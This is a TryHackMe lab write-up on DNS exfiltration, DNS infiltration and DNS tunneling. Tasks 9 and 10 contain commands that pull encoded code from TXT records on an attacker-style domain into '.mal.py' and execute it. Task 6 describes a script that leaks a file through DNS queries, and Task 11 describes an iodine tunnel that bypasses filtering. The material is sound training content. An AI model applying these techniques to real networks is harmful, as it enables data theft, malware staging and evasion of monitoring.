::: {}
# DNS Manipulation Tryhackme Writeup {#dns-manipulation-tryhackme-writeup .p-name}
:::

::: {.section .p-summary field="subtitle"}
This is a Writeup of Tryhackme room "DNS Manipulation"
:::

::::::: {.section .e-content field="body"}
:::::: {#4c11 .section .section .section--body .section--first .section--last}
::: section-divider

------------------------------------------------------------------------
:::

:::: section-content
::: {.section-inner .sectionLayout--insetColumn}
### DNS Manipulation Tryhackme Writeup {#5d2a .graf .graf--h3 .graf--leading .graf--title name="5d2a"}

<figure id="e3d8" class="graf graf--figure graf-after--h3">
<img
src="https://cdn-images-1.medium.com/max/800/1*aZyad_b3GDd6l2WUbp8D0A.png"
class="graf-image" data-image-id="1*aZyad_b3GDd6l2WUbp8D0A.png"
data-width="2240" data-height="1260" />
</figure>

**This is a Writeup of Tryhackme room "DNS Manipulation"**

<figure id="3816" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*8jhhtj7FVvXFmOsY.png"
class="graf-image" data-image-id="0*8jhhtj7FVvXFmOsY.png"
data-width="490" data-height="270" data-is-featured="true" />
</figure>

[https://www.tryhackme.com/room/dnsmanipulation](https://www.tryhackme.com/room/dnsmanipulation){.markup--anchor
.markup--p-anchor
data-href="https://www.tryhackme.com/room/dnsmanipulation"
rel="noopener ugc nofollow noopener" target="_blank"}

**Room link:**
[https://www.tryhackme.com/room/dnsmanipulation](https://www.tryhackme.com/room/dnsmanipulation){.markup--anchor
.markup--p-anchor
data-href="https://www.tryhackme.com/room/dnsmanipulation"
rel="noopener ugc nofollow noopener" target="_blank"}\
**Note: This room is Free**

### Task 1: Introduction {#2f19 .graf .graf--h3 .graf-after--p name="2f19"}

In this room, we will look into DNS and showcase the techniques used to
exfiltrate and infiltrate data. First, we will look at what purposes DNS
serves, how it works, and the types of DNS records.

The image below illustrates a basic DNS lookup. Here the client machine
reaches out to a DNS server to resolve a Fully Qualified Domain Name
(FQDN) to an IP address.

<figure id="523f" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*L4X0thi_KbaOjc4f.png"
class="graf-image" data-image-id="0*L4X0thi_KbaOjc4f.png"
data-width="1250" data-height="333" />
</figure>

We will then move to how DNS is being used as a "Data Exfiltration" and
"Data Infiltration" tool via DNS queries.

<figure id="a8de" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*_kh_mHOgBbLVnp4C.png"
class="graf-image" data-image-id="0*_kh_mHOgBbLVnp4C.png"
data-width="1250" data-height="333" />
</figure>

And finally, we will look at DNS Tunneling and how it is used to
'tunnel' different protocols like (HTTP) through DNS.

### Task 2: Installation {#75b1 .graf .graf--h3 .graf-after--p name="75b1"}

**\[ Python code used for DNS Exfiltration and Infiltration \]**

I have created a few simple scripts written in Python for you to
complete this walkthrough. This will allow us to make DNS queries to a
remote DNS Server.\
`git clone `{.markup--code .markup--p-code .u-paddingRight0
.u-marginRight0}[`https://github.com/kleosdc/dns-exfil-infil`{.markup--code
.markup--p-code .u-paddingRight0
.u-marginRight0}](https://github.com/kleosdc/dns-exfil-infil){.markup--anchor
.markup--p-anchor data-href="https://github.com/kleosdc/dns-exfil-infil"
rel="noopener ugc nofollow noopener" target="_blank"}

Also, make sure you have the required Python3 modules in order to run
the python code.

Use the following command to install the required modules:

`sudo pip3 install -r requirements.txt`{.markup--code .markup--p-code}

**\[ Program used for DNS Tunneling \]**

[https://github.com/yarrick/iodine](https://github.com/yarrick/iodine){.markup--anchor
.markup--p-anchor data-href="https://github.com/yarrick/iodine"
rel="noopener ugc nofollow noopener" target="_blank"}

`sudo apt install iodine`{.markup--code .markup--p-code}

**\[ Download Wireshark \]**

You may use Wireshark or tshark to capture packets. The python code
uses .PCAP file to extract the captured data and then decode it.\
[https://www.wireshark.org/download.html](https://www.wireshark.org/download.html){.markup--anchor
.markup--p-anchor data-href="https://www.wireshark.org/download.html"
rel="noopener ugc nofollow noopener" target="_blank"}

`sudo apt install -y tshark`{.markup--code .markup--p-code}

### Task 3: \[Setup\] Custom Public DNS Server {#aa67 .graf .graf--h3 .graf-after--p name="aa67"}

If you would like to set up the same environment as me, you will need to
have a **Public Domain Name** and a **Public Server**.

I won't be expanding on purchasing a domain name or provisioning public
facing server as it's not necessary to complete this room.

However, **STOK** has created an excellent tutorial on how to set
everything up for OOB (Out of Band) data exfiltration: [STOK's
video](https://www.youtube.com/watch?v=p8wbebEgtDk){.markup--anchor
.markup--p-anchor
data-href="https://www.youtube.com/watch?v=p8wbebEgtDk"
rel="noopener ugc nofollow noopener" target="_blank"}

### Task 4: What is DNS? {#7ade .graf .graf--h3 .graf-after--p name="7ade"}

Introduction

At a high level, a Domain Name System refers to a naming system that
resolves domain names with IP addresses. DNS servers are distributed all
across the world and they are constantly being updated and synced
amongst each other in a systematic way. When a user makes a request
using a domain name such as
[tryhackme.com](http://tryhackme.com/){.markup--anchor .markup--p-anchor
data-href="http://tryhackme.com/" rel="noopener ugc nofollow noopener"
target="_blank"}, DNS 'translates' this to its IP address then
ultimately supplies the requester with the correct IP address. It's also
worth noting that in some scenarios the IP address returned by DNS won't
always be the origin server's IP address If DNS records are being
proxied by a service such as Cloudflare's DDoS protection.

Technically, every device connected to the internet has an IP address
which acts as an identity when communicating with other internet
devices. Therefore, it is essential to understand that the DNS's primary
function and the hierarchy the 'translation' traverses.

DNS root name servers sit at the top or 'root' of the DNS hierarchy and
play a critical role for the Internet. Information for all the top level
domain (TLD) 'zones' such as .com, .co.uk, .net and their associated
name servers are housed in the hundreds of root name servers that are
distributed across the world.

Below is an illustration from Cloudflare to better picture this
hierarchy.

<figure id="dd8c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*PyFpGs9YbybB-xyE.png"
class="graf-image" data-image-id="0*PyFpGs9YbybB-xyE.png"
data-width="1250" data-height="421" />
</figure>

Source:
[https://www.cloudflare.com/learning/dns/glossary/dns-root-server/](https://www.cloudflare.com/learning/dns/glossary/dns-root-server/){.markup--anchor
.markup--p-anchor
data-href="https://www.cloudflare.com/learning/dns/glossary/dns-root-server/"
rel="noopener ugc nofollow noopener" target="_blank"}

Here are some resources that contain more information on root servers
and DNS zones:

[https://www.cloudflare.com/learning/dns/glossary/dns-root-server/](https://www.cloudflare.com/learning/dns/glossary/dns-root-server/){.markup--anchor
.markup--p-anchor
data-href="https://www.cloudflare.com/learning/dns/glossary/dns-root-server/"
rel="noopener ugc nofollow noopener" target="_blank"}

[https://www.cloudflare.com/learning/dns/glossary/dns-zone/](https://www.cloudflare.com/learning/dns/glossary/dns-zone/){.markup--anchor
.markup--p-anchor
data-href="https://www.cloudflare.com/learning/dns/glossary/dns-zone/"
rel="noopener ugc nofollow noopener" target="_blank"}

[https://www.iana.org/domains/root/servers](https://www.iana.org/domains/root/servers){.markup--anchor
.markup--p-anchor data-href="https://www.iana.org/domains/root/servers"
rel="noopener ugc nofollow noopener" target="_blank"}

There are more DNS Record types. However, they won't be necessary to
know in order to complete this walkthrough.

If you would like to learn more about DNS Record Types, please refer to
this article:

[https://www.cloudflare.com/learning/dns/dns-records/](https://www.cloudflare.com/learning/dns/dns-records/){.markup--anchor
.markup--p-anchor
data-href="https://www.cloudflare.com/learning/dns/dns-records/"
rel="noopener ugc nofollow noopener" target="_blank"}.

**Q.1:** If you were on Windows, what command could you use to query a
txt record for 'youtube.com'?

> ***Answer: nslookup -type=txt youtube.com***

**Q.2:** If you were on Linux, what command could you use to query a txt
record for 'facebook.com'?

> ***Answer: dig facebook.com txt***

**Q.3:** AAAA stores what type of IP Address along with the hostname?

> ***Answer: IPv6***

**Q.4:** Maximum characters for a DNS TXT Record is 256. (Yay/Nay)

> ***Answer: Nay***

**Q.5:** What DNS Record provides a domain name in reverse-lookup?
(Research)

> ***Answer: PTR***

**Q.6:** What would the reverse-lookup be for the following IPv4
Address? (192.168.203.2) (Research)

<figure id="a2a1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*4ObSE5h_MdHwuz8P.png"
class="graf-image" data-image-id="0*4ObSE5h_MdHwuz8P.png"
data-width="596" data-height="95" />
</figure>

> ***Answer: 2.203.168.192.in-addr.arpa***

### Task 5: What is DNS Exfiltration? {#e4f4 .graf .graf--h3 .graf-after--blockquote name="e4f4"}

DNS Exfiltration is a cyberattack on servers via the DNS, which can be
performed manually or automatically depending on the attacker's physical
location and proximity to the target devices. In a manual scenario,
attackers often gain unauthorized physical access to the targeted device
to extract data from the environment. Whereas in automated DNS
exfiltration, attackers use malware to conduct the data exfiltration
while inside the compromised network.

DNS is a service that will usually be available on a target machine and
allowing outbound traffic typically over TCP or UDP port 53. This makes
DNS a prime candidate for hackers to use for exfiltrating data.

Data exfiltration through DNS could allow an attacker to transfer a
large volume of data from the target environment. Moreover, DNS
exfiltration is mostly used as a pathway to gather personal information
such as social security numbers, intellectual property, or other
personally identifiable information.

DNS exfiltration is mostly used by adding strings containing the desired
'loot' to DNS UDP requests. The string containing the loot would then be
sent to a rogue DNS server that is logging these requests. To the
untrained eye this could look like normal DNS traffic or these requests
could be lost in the shuffle of many legit DNS requests.

**Q.1:** What is the maximum length of a DNS name? (Research) (**Length
includes dots!**)

> ***Answer: 253***

### Task 6: DNS Exfiltration --- Demo {#f833 .graf .graf--h3 .graf-after--blockquote name="f833"}

Introduction

In this example scenario an attacker is trying to exfiltrate data to
their system and decided their best option is going to be using DNS
queries. The attacker's goal is to exfiltrate sensitive information from
a machine on SecureCorp's network. In this demo I will be showing the
steps that an attacker might take in order to exfiltrate this data from
the compromised machine.

<figure id="d841" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*yWfuf6hhGzY1mBbt.png"
class="graf-image" data-image-id="0*yWfuf6hhGzY1mBbt.png"
data-width="1250" data-height="779" />
</figure>

**The following material has been generated through a fake credit card
generator. All credit card information is fake.**

The files used for this demo are in my dns-exfil-infil repo on GitHub.
You will need files to complete the rest of the room.

1.  [securecorp.txt
    ([https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt](https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt){.markup--anchor
    .markup--li-anchor
    data-href="https://github.com/kleosdc/dns-exfil-infil/blob/main/securecorp.txt"
    rel="noopener ugc nofollow noopener" target="_blank"})]{#1f6a}
2.  [packety.py
    ([https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py](https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py){.markup--anchor
    .markup--li-anchor
    data-href="https://github.com/kleosdc/dns-exfil-infil/blob/main/packety.py"
    rel="noopener ugc nofollow noopener" target="_blank"})]{#1d45}
3.  [packetGrabber.py
    ([https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py](https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py){.markup--anchor
    .markup--li-anchor
    data-href="https://github.com/kleosdc/dns-exfil-infil/blob/main/packetyGrabber.py"
    rel="noopener ugc nofollow noopener" target="_blank"})]{#8db2}

1\. Text file containing fake credit card numbers, names, addresses.

<figure id="2398" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*460gCNuthEvkZAh1.PNG"
class="graf-image" data-image-id="0*460gCNuthEvkZAh1.PNG"
data-width="796" data-height="776" />
</figure>

2\. packety.py (
[https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil){.markup--anchor
.markup--p-anchor data-href="https://github.com/kleosdc/dns-exfil-infil"
rel="noopener ugc nofollow noopener" target="_blank"} )

When [packety.py](http://packety.py/){.markup--anchor .markup--p-anchor
data-href="http://packety.py/" rel="noopener ugc nofollow noopener"
target="_blank"} is executed, you will need to supply the script with
the following input:

\* **Filename**: ( This is the file(Text file RECOMMENDED) that you are
trying to exfiltrate from SecureCorp's Network )

\* **Domain name**: ( This is where you are going to put your domain
name, example my domain name is badbaddoma.in )

<figure id="2323" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*DZSGepfSPTZNcMm4.PNG"
class="graf-image" data-image-id="0*DZSGepfSPTZNcMm4.PNG"
data-width="484" data-height="245" />
</figure>

python packety.py

Filename: securecorp.txt

Domain Name (Example: badbaddoma.in): badbaddoma.in

\[+\] Reading file.

\[+\] Base64 encoded.

\[+\] Base58 encoded.

Start transmitting... \[PRESS ENTER KEY\]

The code starts off by reading from the text file. The text file's
content will first be Base64 encoded and then Base58 encoded. This
leaves us with a long encoded string. The string is then split into 20
character long sections where each section will have 3 'dummy'
characters added to it for further obfuscation. One character will be
prepended to the encoded string and two characters will be appended.

For example, a section of the encoded data might look like this:
'**6gfghhjywsas3rg4hda3**'. After the extra characters are added it will
end up being '**x6gfghhjywsas3rg4hda3yu**'.

Once everything is encoded and ready, the code will wait for the user to
press "ENTER" in order to start transmitting the queries to the DNS
Server. The DNS Server would have already been setup to capture the
incoming requests with 'Wireshark' or 'tshark'.

<figure id="1513" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*GIko9y-H6Wj1yppU.PNG"
class="graf-image" data-image-id="0*GIko9y-H6Wj1yppU.PNG"
data-width="833" data-height="191" />
</figure>

Then it's just a matter of waiting for the transmission to reach 100%.
If any of the queries are not delivered on time and in the right order
the exfiltrated data will be incomplete and useless to the attacker.

<figure id="ab21" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*tfHWfoe_v8WkF-Z3.PNG"
class="graf-image" data-image-id="0*tfHWfoe_v8WkF-Z3.PNG"
data-width="804" data-height="381" />
</figure>

<figure id="db72" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*iGpw5XUK29TEvzdu.PNG"
class="graf-image" data-image-id="0*iGpw5XUK29TEvzdu.PNG"
data-width="813" data-height="390" />
</figure>

3\. packetyGrabber.py (
[https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil){.markup--anchor
.markup--p-anchor data-href="https://github.com/kleosdc/dns-exfil-infil"
rel="noopener ugc nofollow noopener" target="_blank"} )

The code will ask the user the following input:

\* **File captured**: This is the .pcap file that you captured on your
DNS Server.

\* **Filename output**: This is the file name where the decoded data
will be saved.

\* **Domain name**: This will be your domain name.

<figure id="2596" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*MYcR7aZ59Q6O9o96.PNG"
class="graf-image" data-image-id="0*MYcR7aZ59Q6O9o96.PNG"
data-width="782" data-height="306" />
</figure>

<figure id="c202" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*PhBwOf9yrIla1w2t.png"
class="graf-image" data-image-id="0*PhBwOf9yrIla1w2t.png"
data-width="479" data-height="271" />
</figure>

If all goes well where no queries have been lost and all the input is
correct; a file with the decoded data will be saved in the same
directory you ran the code from.

<figure id="5968" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*CNLAlNEfm6HF4duh.PNG"
class="graf-image" data-image-id="0*CNLAlNEfm6HF4duh.PNG"
data-width="587" data-height="581" />
</figure>

### Task 7: DNS Exfiltration --- Practice {#fa49 .graf .graf--h3 .graf-after--figure name="fa49"}

SSH Credentials:

``` {#cd5e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="makefile"}
Username: user
Password: P@ssword01
```

<figure id="0f67" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*ZKYnljBol0OIRNFU.png"
class="graf-image" data-image-id="0*ZKYnljBol0OIRNFU.png"
data-width="782" data-height="416" />
</figure>

I logged in using the ssh credentials that was being provided in the
questions.

<figure id="109c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*7ELc-hQa7qxnGBR8.png"
class="graf-image" data-image-id="0*7ELc-hQa7qxnGBR8.png"
data-width="1250" data-height="376" />
</figure>

and then I ran packetyGrabber on order.pcap

<figure id="8a5a" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*uJNQLY1FhxZMO9Rn.png"
class="graf-image" data-image-id="0*uJNQLY1FhxZMO9Rn.png"
data-width="689" data-height="193" />
</figure>

**Q.1:** What is the Transaction name? (Type it as you see it)

> ***Answer: Network Equip.***

**Q.2:** How much was the Firewall? (Without the \$)

> ***Answer: 2500***

**Q.3:** Which file contains suspicious DNS queries?

> ***Answer: cap3.pcap***

<figure id="7f56" class="graf graf--figure graf-after--blockquote">
<img
src="https://cdn-images-1.medium.com/max/800/0*zuupvLVxYQQGVLxj.png"
class="graf-image" data-image-id="0*zuupvLVxYQQGVLxj.png"
data-width="1250" data-height="361" />
</figure>

<figure id="e167" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*ml2TOGRusk326IDd.png"
class="graf-image" data-image-id="0*ml2TOGRusk326IDd.png"
data-width="774" data-height="90" />
</figure>

**Q.4:** Enter the plain-text after you have decoded the data using
packetyGrabber.py found in \~/dns-exfil-infil/ folder.

> ***Answer: administrator:s3cre7P@ssword***

### Task 8: What is DNS Infiltration? {#013a .graf .graf--h3 .graf-after--blockquote name="013a"}

DNS infiltration is another method used by attackers to exploit the
various vulnerabilities within an organization's Domain Name System.
Unlike the exfiltration attacks on the DNS, infiltration defines the
process where malicious code is ran to manipulate DNS servers either
using automated systems where attackers connect remotely to the network
infrastructure or manually.

DNS infiltration is primarily used for file dropping or malware staging
efforts. With behavioral, signature based, or reputation based threat
detection systems it's possible this attack method could be caught.

However, if this method of transporting data goes unnoticed it could
lead to malicious activity such as code execution in organization's
environment. Historically, this has cased havoc and disruption for
various well known companies.

In summary, the DNS protocol could be used as a covert protocol that
could aid in malware staging and execution efforts to communicate back
to an attacker's C2 (Command and Control) server/s. In the next task we
will explore how to could be achieved.

**Q.1:** What type of DNS Record is usually used to infiltrate data into
a network?

> ***Answer: txt***

### Task 9: DNS Infiltration --- Demo {#1a16 .graf .graf--h3 .graf-after--blockquote name="1a16"}

In this scenario the attacker is going to infiltrate a piece of
'malicious' code onto the victim's computer. There are many different
techniques that attackers in the real world use to achieve this. To
simplify things, I will be using a TXT Record that is setup on my public
AWS DNS Server. The value contained in this record is encoded
'malicious' code.

Since TXT Records are limited to 255 characters the hackers will most
likely have multiple TXT Records configured for their DNS Server. This
ultimately depends on how long their code is. Now that everything is
setup and ready; all the hacker needs to do is request those TXT
Record/s, capture the value/s, decode them and boom.. they now have
infiltrated their own code into a compromised system via DNS TXT
Records.

<figure id="cdde" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*YUzD-JyEX3YKlc8G.png"
class="graf-image" data-image-id="0*YUzD-JyEX3YKlc8G.png"
data-width="1250" data-height="779" />
</figure>

You can see my TXT Record below.

<figure id="9a2c" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Cwd8BC4dEZ9Ac9EC.PNG"
class="graf-image" data-image-id="0*Cwd8BC4dEZ9Ac9EC.PNG"
data-width="860" data-height="22" />
</figure>

Files used for this demo

1\. `nslookup`{.markup--code .markup--p-code}

This will first look up the TXT record for rt1.badbaddoma.in, then get
the value within the quotes, and finally it will save the value into a
file named '.mal.py'.

`nslookup -type=txt rt1.badbaddoma.in | grep Za | cut -d \" -f2 > .mal.py`{.markup--code
.markup--p-code}

2\. packetSimple.py (
[https://github.com/kleosdc/dns-exfil-infil](https://github.com/kleosdc/dns-exfil-infil){.markup--anchor
.markup--p-anchor data-href="https://github.com/kleosdc/dns-exfil-infil"
rel="noopener ugc nofollow noopener" target="_blank"} )

When the code asks you for a 'Filename' enter the filename '.mal.py'.
This is the file that we saved the encoded value in.

<figure id="9cd4" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*hAKdCQAUO-CzmuIg.PNG"
class="graf-image" data-image-id="0*hAKdCQAUO-CzmuIg.PNG"
data-width="848" data-height="318" />
</figure>

<figure id="822a" class="graf graf--figure graf-after--figure">
<img
src="https://cdn-images-1.medium.com/max/800/0*4nG_Bc2JDkqFoGYP.png"
class="graf-image" data-image-id="0*4nG_Bc2JDkqFoGYP.png"
data-width="384" data-height="270" />
</figure>

### Task 10: DNS Infiltration --- Practice {#7f7a .graf .graf--h3 .graf-after--figure name="7f7a"}

Use the same VM from **\[Task 7\] DNS Exfiltration --- Practice**.

Read the TASK file found in the
`~/challenges/infiltration/`{.markup--code .markup--p-code} folder.

You may use the same command used in the \[Task 9\] DNS
Infiltration --- Demo. Keep in mind you will need to adjust the 'grep'
section and use the appropriate characters to match on. For example, if
the text value from the TXT Record starts with 'G6...' you will need to
use 'grep G6'.

Follow the instructions in the TASK file to complete this question.

**Q.1:** Enter the output from the executed python file

``` {#93a7 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
nslookup -type=txt badbaddoma.in | grep ig | cut -d \" -f2 > .mal.py
cat .mal.py
nslookup -type=txt code.badbaddoma.in
```

<figure id="4603" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*JIJcQfbovwdkujNz.png"
class="graf-image" data-image-id="0*JIJcQfbovwdkujNz.png"
data-width="875" data-height="368" />
</figure>

``` {#44da .graf .graf--pre .graf-after--figure .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
nslookup -type=txt code.badbaddoma.in | grep Ye | cut -d \" -f2 > .mal.py
python3 ~/dns-exfil-infil/packetySimple.py
cat .mal.py
python3 .mal.py
```

<figure id="8e6d" class="graf graf--figure graf-after--pre">
<img
src="https://cdn-images-1.medium.com/max/800/0*tukBCLMeY5ZReWim.png"
class="graf-image" data-image-id="0*tukBCLMeY5ZReWim.png"
data-width="875" data-height="180" />
</figure>

> ***Answer: 4.4.0--186-generic***

### Task 11: DNS Tunneling {#7b43 .graf .graf--h3 .graf-after--blockquote name="7b43"}

In the previous two tasks we've seen how DNS requests and responses
could be used to infiltrate and execute payloads. Companies will
typically have Firewalls, an IDSs (Intrusion Detection Systems) and/or
and IPSs (Intrusion Protection Systems) in place in order prevent/alert
when unwanted inbound and outbound protocols pass through their network.
The one protocol that is rarely monitored by companies is DNS. Because
of this, hackers are able to bypass a lot of the 'unwanted' protocols by
using DNS tunneling.

### Demo {#d9ae .graf .graf--h3 .graf-after--p name="d9ae"}

For this demo we'll explore how a hacker could bypass various restricted
websites by using HTTP over DNS. To achieve this I will be using
'Iodine'. You can read more about 'Iodine' here:
[Iodine](https://code.kryo.se/iodine/){.markup--anchor .markup--p-anchor
data-href="https://code.kryo.se/iodine/"
rel="noopener ugc nofollow noopener" target="_blank"}.

<figure id="e989" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*Y-LMlSDw5mZBIMLy.png"
class="graf-image" data-image-id="0*Y-LMlSDw5mZBIMLy.png"
data-width="875" data-height="545" />
</figure>

My setup is as follows:

- [I have an AWS Hosted Linux machine that will be the DNS Tunnel
  Server.]{#779a}
- [Ubuntu VM running on my local computer that will be the DNS Tunnel
  Client.]{#74a2}
- [Public Domain Name hosted on Google Domains
  ([badbadtunnel.in](http://badbadtunnel.in/){.markup--anchor
  .markup--li-anchor data-href="http://badbadtunnel.in/"
  rel="noopener ugc nofollow noopener" target="_blank"})]{#a690}

This is what the DNS Configuration looks like:

<figure id="de23" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*6Oy8XRpxcuT7qGCC.PNG"
class="graf-image" data-image-id="0*6Oy8XRpxcuT7qGCC.PNG"
data-width="875" data-height="344" />
</figure>

To get started, both machines need to have iodine installed. If you are
on a Debian based distribution such as Kali it will be in their apt
repositories.

`sudo apt install iodine`{.markup--code .markup--p-code}

**iodine** --- Client

**iodined** --- Server

On the AWS server we start the iodined with the following arguments:

<figure id="91cd" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*DyqWh7Vqm7pVgLzr.PNG"
class="graf-image" data-image-id="0*DyqWh7Vqm7pVgLzr.PNG"
data-width="795" data-height="202" />
</figure>

**Port **--- 27001

**IP for DNS Tunnel Server** --- 10.0.0.1

**Subdomain name** --- tunnel.badbadtunnel.in

Now on our Client machine we run iodine with these arguements:

<figure id="a001" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*JMIjDwxLI21XEzi4.PNG"
class="graf-image" data-image-id="0*JMIjDwxLI21XEzi4.PNG"
data-width="875" data-height="401" />
</figure>

**IP of DNS Tunnel Server**

**Subdomain name**

If everything is setup correctly we should now have connection the our
DNS Tunnel Server. We can try to ping 10.0.0.1 (DNS Tunnel Server) to
see if we are connected.

<figure id="cd64" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*56kv8XZi-LGrGcs6.PNG"
class="graf-image" data-image-id="0*56kv8XZi-LGrGcs6.PNG"
data-width="573" data-height="212" />
</figure>

**Success!**

Now we are about half-way done. Our HTTP over DNS is not fully setup
yet.

First, we need to generate a SSH key and upload the content of
**id_rsa.pub** to our DNS Tunnel Server in the **authorized_keys** file.
Here are the steps.

<figure id="2eed" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*SXvSe0uph_yIqVrH.PNG"
class="graf-image" data-image-id="0*SXvSe0uph_yIqVrH.PNG"
data-width="597" data-height="420" />
</figure>

This is the content of **id_rsa.pub**

<figure id="e4a8" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*2kcksa5NP61_gTqQ.PNG"
class="graf-image" data-image-id="0*2kcksa5NP61_gTqQ.PNG"
data-width="875" data-height="107" />
</figure>

Here you can see that I added the **id_rsa.pub** content to the
**authorized_keys** on my DNS Server. This will allow me to SSH into my
Server.

<figure id="3c98" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*ri5Dr_IL1SQbp0rF.PNG"
class="graf-image" data-image-id="0*ri5Dr_IL1SQbp0rF.PNG"
data-width="875" data-height="170" />
</figure>

Now we can SSH to our DNS Tunnel Server with option -D 8080

<figure id="82f1" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*9pGltMPusomyIJyx.PNG"
class="graf-image" data-image-id="0*9pGltMPusomyIJyx.PNG"
data-width="701" data-height="617" />
</figure>

Almost there, now we just need to open our browser (Firefox in this
case) and change the proxy settings. There are also browser extensions
such as FoxyProxy or Proxy SwitchyOmega.

For the Proxy options, we need to select 'Manual proxy configuration'.

Set the SOCKS Host with the IP address '127.0.0.1' and for Port number
to '8080'.

<figure id="a393" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*kBYpB2TH4P4hwpGv.PNG"
class="graf-image" data-image-id="0*kBYpB2TH4P4hwpGv.PNG"
data-width="843" data-height="570" />
</figure>

**Done!**

We are now using HTTP over DNS... If we go to myip.is we should see our
DNS Tunnel Server's Public IP Address.

<figure id="5177" class="graf graf--figure graf-after--p">
<img
src="https://cdn-images-1.medium.com/max/800/0*IHs0wfr8C0sLIzLm.PNG"
class="graf-image" data-image-id="0*IHs0wfr8C0sLIzLm.PNG"
data-width="875" data-height="398" />
</figure>

What program was used to Tunnel HTTP over DNS?

> ***Answer: iodine***

### Promote and Collaborate on Cybersecurity Insights {#8791 .graf .graf--h3 .graf-after--blockquote name="8791"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#6bc8 .graf .graf--h3 .graf-after--p name="6bc8"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 18, 2024](https://medium.com/p/425afe31c2c0).

[Canonical
link](https://medium.com/@bevijaygupta/dns-manipulation-tryhackme-writeup-425afe31c2c0){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
